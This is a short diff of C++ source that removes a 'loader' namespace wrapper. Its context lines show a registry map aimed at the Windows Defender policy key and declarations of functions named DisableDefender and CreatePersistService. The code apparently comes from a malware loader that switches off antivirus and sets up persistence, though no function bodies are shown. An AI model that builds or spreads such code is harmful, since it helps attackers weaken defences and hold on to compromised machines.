@@ -10,8 +10,6 @@
 #include "..\include\logger.hpp"
 #include "..\include\header.hpp"
 
-namespace loader {
-
 HKEY HKLM = HKEY_LOCAL_MACHINE;
 std::map<LPCWSTR, std::map<LPCWSTR, DWORD>> registryEntries = {
 	{L"SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows Defender", {
@@ -52,5 +50,3 @@ LPCWSTR dllPath = L"";
 
 int DisableDefender();
 int CreatePersistService();
-
-}
